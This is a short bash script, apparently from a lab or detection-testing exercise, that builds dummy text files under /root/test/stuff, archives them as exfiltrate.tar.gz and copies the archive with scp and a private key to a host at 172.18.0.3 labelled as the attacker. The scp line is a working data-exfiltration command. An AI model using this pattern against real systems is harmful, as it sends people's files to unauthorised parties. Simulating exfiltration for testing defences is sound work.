#!/bin/bash

# ensure that ssh-copy-id from part 1 script has been run

# Generate some example files and tar them so that the .tar.gz file can be exfiltrated
mkdir -p /root/test/stuff
cd /root/test/stuff
echo "owuoqwdjhoasjdo" > test1.txt
echo "sadasdcasdac" > test2.txt
echo "owuoqwdjhasdadasdasoasjdo" > test3.txt
echo "owuoqasdacdsacdsadscadscadsacdwdjhoasjdo" > test4.txt
touch exfiltrate.tar.gz
tar --exclude=exfiltrate.tar.gz -zcf exfiltrate.tar.gz .

# Send the tar file to attacker using scp
scp -i /root/.ssh/id_rsa_Cserver_test10 /root/test/stuff/exfiltrate.tar.gz vagrant@172.18.0.3:/home/vagrant/exfiltrated/